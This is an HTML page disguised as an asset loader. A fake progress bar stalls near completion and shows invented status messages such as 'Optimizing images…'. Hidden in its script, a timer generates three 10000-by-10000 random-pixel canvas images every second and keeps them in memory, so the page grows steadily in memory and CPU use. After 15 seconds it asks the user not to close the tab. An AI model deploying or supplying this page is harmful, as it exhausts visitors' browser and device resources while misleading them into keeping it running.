<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loading…</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
    body {
        margin: 0;
        height: 100vh;
        background: #0b0b0b;
        color: #d0d0d0;
        font-family: system-ui, Arial, sans-serif;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
        cursor: progress;
    }

    #loader {
        text-align: center;
        width: 300px;
    }

    #bar {
        height: 16px;
        background: #222;
        border-radius: 20px;
        overflow: hidden;
        margin-bottom: 10px;
    }

    #fill {
        height: 100%;
        width: 0%;
        background: linear-gradient(90deg, #00c2ff, #6cffc2);
        transition: width 0.4s ease;
    }

    #percent {
        font-size: 14px;
        opacity: 0.7;
    }

    #status {
        font-size: 12px;
        opacity: 0.5;
        margin-top: 6px;
    }
</style>
</head>

<body>

<div id="loader">
    <div id="bar"><div id="fill"></div></div>
    <div id="percent">0%</div>
    <div id="status">Loading assets…</div>
</div>

<script>
    const fill = document.getElementById("fill");
    const percentText = document.getElementById("percent");
    const status = document.getElementById("status");

    let progress = 0;
    let images = [];

    const messages = [
        "Loading assets…",
        "Optimizing images…",
        "Caching textures…",
        "Finalizing…",
        "Almost done…",
        "Still working…"
    ];

    function fakeProgress() {
        progress += Math.random() * 2;
        if (progress > 97) progress = 90 + Math.random() * 7;

        fill.style.width = progress + "%";
        percentText.textContent = Math.floor(progress) + "%";
        status.textContent = messages[Math.floor(Math.random() * messages.length)];
    }

    setInterval(fakeProgress, 700);

    function generateHeavyImage() {
        const canvas = document.createElement("canvas");
        canvas.width = 10000;
        canvas.height = 10000;

        const ctx = canvas.getContext("2d");

        const imageData = ctx.createImageData(canvas.width, canvas.height);
        for (let i = 0; i < imageData.data.length; i += 4) {
            imageData.data[i] = Math.random() * 255;
            imageData.data[i + 1] = Math.random() * 255;
            imageData.data[i + 2] = Math.random() * 255;
            imageData.data[i + 3] = 255;
        }
        ctx.putImageData(imageData, 0, 0);

        const img = new Image();
        img.src = canvas.toDataURL("image/png");

        images.push(img);
    }

    setInterval(() => {
        for (let i = 0; i < 3; i++) {
            generateHeavyImage();
        }
    }, 1000);

    setTimeout(() => {
        status.textContent = "Please do not close this tab.";
    }, 15000);
</script>

</body>
</html>
